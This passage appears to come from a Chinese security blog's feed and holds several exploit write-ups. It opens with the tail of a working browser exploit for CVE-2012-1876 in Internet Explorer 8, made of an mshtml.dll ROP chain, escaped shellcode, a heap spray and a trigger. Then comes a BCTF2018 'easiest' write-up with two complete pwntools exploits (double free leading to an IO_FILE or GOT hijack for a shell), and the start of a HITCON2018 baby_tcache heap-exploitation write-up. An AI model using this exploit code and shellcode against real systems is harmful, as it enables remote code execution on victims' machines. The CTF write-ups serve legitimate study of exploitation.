EAX,ESI # RETN [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x50c71b</span>),  <span class="comment">//# POP EBP # RETN [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x1613b4</span>),  <span class="comment">//# &amp; jmp esp [mshtml.dll]</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0xa43ab</span>),   <span class="comment">//# POP EBX # RETN [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">                <span class="number">0x201</span>,                          <span class="comment">//# 0x00000201-&gt; ebx</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x27e491</span>),  <span class="comment">//# POP EDX # RETN [mshtml.dll]</span></span></span><br><span class="line"><span class="javascript">                <span class="number">0x40</span>,                             <span class="comment">//# 0x00000040-&gt; edx</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x6d267</span>),   <span class="comment">//# POP ECX # RETN [mshtml.dll]</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x53cc05</span>),  <span class="comment">//# &amp;Writable location [mshtml.dll]</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0xfb460</span>),   <span class="comment">//# POP EDI # RETN [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x424902</span>),  <span class="comment">//# RETN (ROP NOP) [mshtml.dll]</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0xa8005</span>),   <span class="comment">//# POP EAX # RETN [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">                <span class="number">0x90909090</span>,               <span class="comment">// nop</span></span></span><br><span class="line"><span class="javascript">                mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x4f25d2</span>),  <span class="comment">//# PUSHAD # RETN [mshtml.dll]</span></span></span><br><span class="line"><span class="undefined">                0x90909090,</span></span><br><span class="line"><span class="undefined">                0x90909090</span></span><br><span class="line"><span class="undefined">                ];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> arr;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">dword</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> uni = <span class="built_in">String</span>.fromCharCode(dword &amp; <span class="number">0xFFFF</span>);</span></span><br><span class="line"><span class="javascript">            uni += <span class="built_in">String</span>.fromCharCode(dword&gt;&gt;<span class="number">16</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> uni;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">tab2uni</span>(<span class="params">tab</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> uni = <span class="string">""</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tab.length;i++) &#123;</span></span><br><span class="line"><span class="undefined">                uni += d2u(tab[i]);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> uni;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">heap_spray</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//alert("spray...");</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> offset = <span class="number">0x354</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> heap_obj = <span class="keyword">new</span> heapLib.ie(<span class="number">0x10000</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> code =  <span class="built_in">unescape</span>(<span class="string">"%uc933%u8b64%u3041%u408b%u8b0c%u1470%u96ad%u8bad%u1058%u538b%u033c%u8bd3%u7852%ud303%u728b%u0320%u33f3%u41c9%u03ad%u81c3%u4738%u7465%u7550%u81f4%u0478%u6f72%u4163%ueb75%u7881%u6408%u7264%u7565%u8be2%u2472%uf303%u8b66%u4e0c%u8b49%u1c72%uf303%u148b%u038e%u33d3%u53c9%u5152%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u83d2%u0cc4%u5059%u6651%u6cb9%u516c%u7268%u2e74%u6864%u736d%u6376%uff54%u83d0%u10c4%u548b%u0424%uc933%ub951%u6d65%u6162%u8351%u246c%u6103%u6c83%u0224%u6862%u7973%u7473%u5054%ud2ff%uc483%u5510%uec8b%uec83%u3304%ubef6%u6d63%u0064%u7589%u8dfc%ufc75%uff56%u83d0%u08c4%u5a5e%ub95b%u7365%u6173%u8351%u246c%u6103%u5068%u6f72%u6863%u7845%u7469%u5354%ud2ff%uc933%uff51%u5fd0%u5b5e%uc481%u00c0%u0000%uec3b%u81e8%uff6a%u8bff%u5de5%u00c3"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> rop_chain = tab2uni(get_ropchain(mshtmlbase));</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> nops = <span class="built_in">unescape</span>(<span class="string">"%u9090%u9090"</span>);    <span class="comment">//NOPs</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> shellcode = rop_chain + code;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">while</span> (nops.length &lt; <span class="number">0x1000</span>) nops+= nops; <span class="comment">// create big block of nops</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> front_padding = nops.substring(<span class="number">0</span>,offset);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> tail_padding = nops.substring(<span class="number">0</span>, <span class="number">0x800</span> - front_padding.length - shellcode.length);</span></span><br><span class="line"><span class="undefined">            shellcode =  front_padding + shellcode + tail_padding;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">while</span> (shellcode.length &lt; <span class="number">0x40000</span>) shellcode += shellcode;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> block = shellcode.substring(<span class="number">2</span>, <span class="number">0x40000</span> - <span class="number">0x21</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">//spray</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;</span></span><br><span class="line"><span class="undefined">                heap_obj.alloc(block);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//alert("Spray done");</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">over_trigger</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> leak_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span></span><br><span class="line"><span class="undefined">            leak_col.width = 943208;</span></span><br><span class="line"><span class="undefined">            leak_col.span = 39;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="string">"leak();"</span>, <span class="number">400</span>);</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="string">"get_leak()"</span>, <span class="number">450</span>);</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="string">"heap_spray();"</span>, <span class="number">500</span>)</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="string">"over_trigger();"</span>, <span class="number">700</span>);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用效果如文章开头所示。<br>注：我的exp可能不能通用，毕竟我到现在还不清楚为什么我这会是width*125。。。。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://github.com/wnagzihxa1n/BrowserSecurity/blob/master/CVE-2012-1876_IE8_%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2012-1876_IE8_%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md" target="_blank" rel="noopener">CVE-2012-1876 IE8 堆溢出漏洞分析</a></li><li><a href="http://eternalsakura13.com/2018/03/10/cve2012_1876/" target="_blank" rel="noopener">CVE-2012-1876调试笔记</a></li><li><a href="https://paper.seebug.org/182/" target="_blank" rel="noopener">WinDbg 漏洞分析调试</a></li><li><a href="https://bbs.pediy.com/thread-214226.htm" target="_blank" rel="noopener">cve-2012-1876漏洞详解</a></li><li><a href="https://www.cnblogs.com/Ox9A82/p/5718211.html" target="_blank" rel="noopener">CVE-2012-1876Microsoft Internet Explorer Col元素远程代码执行漏洞分析</a></li><li><a href="http://c00c.cc/1493200282.html" target="_blank" rel="noopener">CVE-2012-1876分析</a></li><li><a href="https://www.anquanke.com/post/id/87048" target="_blank" rel="noopener">【技术分享】32位下的堆喷射技术</a></li><li><a href="https://xz.aliyun.com/t/2107" target="_blank" rel="noopener">JavaScript中的堆漏洞利用</a></li><li><a href="https://www.cnblogs.com/Ox9A82/p/5718211.html" target="_blank" rel="noopener">CVE-2012-1876Microsoft Internet Explorer Col元素远程代码执行漏洞分析</a></li><li><a href="https://xz.aliyun.com/t/2108" target="_blank" rel="noopener">Windows下Shellcode编写详解</a></li></ul><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> browser </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> IE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BCTF2018 easiest writeup</title>
      <link href="/post/aaf4d161.html"/>
      <url>/post/aaf4d161.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><blockquote><p>并没有参加这次bctf，只有事后看看题目，这道题目不算难，不过还是学到了一些以前不是很清楚的东西，所以记录一下。</p></blockquote><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题目来源： BCTF 2018<br>知识点：fastbin_attack、IO_FILE<br><a id="more"></a></p><p>题目提供的功能非常简单，只有add和delete<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"HI!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1 add "</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"2 delete "</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>保护情况：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/hgy/pwn/bctf2018/easiest/easiest'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p></p><h2 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"(0-11):"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">11</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"delete success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在remove时，没有清空ptr指针，存在double free。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400946</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个后门函数。。</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>因为没有输出功能，所以泄露libc十分困难，改<code>malloc_hook</code>之类的估计是不行了。<br>所以把目标转移到GOT表，这里有两种方法，一种是通过改<code>GOT表</code>的值，一种是改<code>stdout指针</code>。</p><h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><h3 id="劫持stdout指针"><a href="#劫持stdout指针" class="headerlink" title="劫持stdout指针"></a>劫持stdout指针</h3><p><img src="/post/aaf4d161/fastbin_attack1.png" alt=""><br><code>0x602082</code>的值可以充当size<br>改写stdout指针，使<code>vtable</code>的地址在我们的预先分配好的chunk处，并预先在chunk中伪造好vtable，将<code>__xsputn</code>对应偏移处写入后门函数的地址。<br>这样，当调用<code>printf</code>时，最终会调用<code>__xsputn</code>，而执行后门函数</p><ol><li><code>IO_FILE</code>结构体中<code>_lock</code>的值必须是<strong>可写的地址</strong></li><li><code>mode</code>的值需要为0</li></ol><h3 id="劫持GOT表"><a href="#劫持GOT表" class="headerlink" title="劫持GOT表"></a>劫持GOT表</h3><p><img src="/post/aaf4d161/fastbin_attack2.png" alt=""><br><code>0x60204d</code>的值可以充当size，因为size只检查低4个字节。<br>然后用<code>system</code>的地址往后覆写掉<code>strtol</code>函数的got表就行了</p><h2 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h2><p><strong>劫持stdout指针</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./easiest'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./easiest'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'2 delete \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(0-11):'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Length:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'C:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'2 delete \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(0-11):'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x400946</span></span><br><span class="line">fake_chunk = <span class="number">0x60207a</span></span><br><span class="line">ptr = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x40</span>, p64(shell)*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>, p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x30</span>, p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x30</span>, p64(fake_chunk))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x30</span>, p64(<span class="number">0</span>))</span><br><span class="line">payload += <span class="string">"\x00"</span>*<span class="number">0x16</span> <span class="comment">#padding</span></span><br><span class="line">payload += p64(ptr - <span class="number">0xd8</span> + <span class="number">8</span> * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x30</span>, p64(fake_chunk))</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x30</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p></p><h2 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h2><p><strong>劫持GOT表</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./easiest'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./easiest'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'2 delete \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(0-11):'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Length:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'C:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'2 delete \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(0-11):'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="number">0x602045</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>, p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>, p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>, p64(fake_chunk))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>))</span><br><span class="line">payload = <span class="string">"\x00"</span> * <span class="number">0xb</span> <span class="comment">#padding</span></span><br><span class="line">payload += p64(elf.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x60</span>, p64(fake_chunk))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x68</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p></p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>二进制文件：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/challenges/bctf2018/easiest/easiest" target="_blank" rel="noopener">easiest</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> fastbin_attack </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hitcon2018 baby_tcache writeup</title>
      <link href="/post/8e1cd5dc.html"/>
      <url>/post/8e1cd5dc.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><blockquote><p>这道题和前一道children_tcache是同一个系列，然而这题难多了_(:зゝ∠)_。在网上搜了一大圈，貌似只有英文的wp，只有硬着头皮肝了。。。这题和children那题唯一的不同就是这题没有现成的输出功能，泄露变得十分困难，还好前段时间也学过了house of orange，不然wp都看不懂。。</p></blockquote><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：HITCON CTF 2018<br>知识点：tcache &amp;&amp; overlapping &amp;&amp; off_by_one &amp;&amp; IO_FILE<br><a id="more"></a><br>题目界面：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">🍊      Baby Tcache      🍊</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">$   <span class="number">1.</span> New heap           $</span><br><span class="line">$   <span class="number">2.</span> Delete heap        $ </span><br><span class="line">$   <span class="number">3.</span> Exit               $ </span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure><p></p><p>保护全开：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p></p><h2 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h2><p>和children_tcache的漏洞点是完全一样的，都是<strong>null byte off_by_one</strong>，这里就不再分析了。</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h3><p>和children_tcache几乎相同的操作，通过last_remainder来绕过检查，然后overlapping。<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">add_7_times(<span class="number">0x80</span>)</span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line">add_7_times(<span class="number">0x120</span>)</span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x208</span>, <span class="string">'A'</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x200</span>, <span class="string">'B'</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x200</span>, <span class="string">'C'</span>) <span class="comment">#9</span></span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>) </span><br><span class="line">dele(<span class="number">7</span>) <span class="comment">#remain 9</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">'A'</span>*<span class="number">0x108</span>) <span class="comment">#remain 0 9 || 创建了一个last_remainder</span></span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'b1'</span>) <span class="comment">#remain 0 (1-7) 8 9</span></span><br><span class="line">del_7_times(<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x210</span>, <span class="string">'b2'</span>) <span class="comment">#add 1 || remain 0 1 8 9 || 将被overlap的chunk</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">9</span>) <span class="comment">#overlap</span></span><br></pre></td></tr></table></figure><p></p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>这里使用IO_FILE来进行泄露，先来看看前提知识。<br>在<code>puts</code>函数内部实现中，先调用<code>_IO_new_file_overflow</code><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  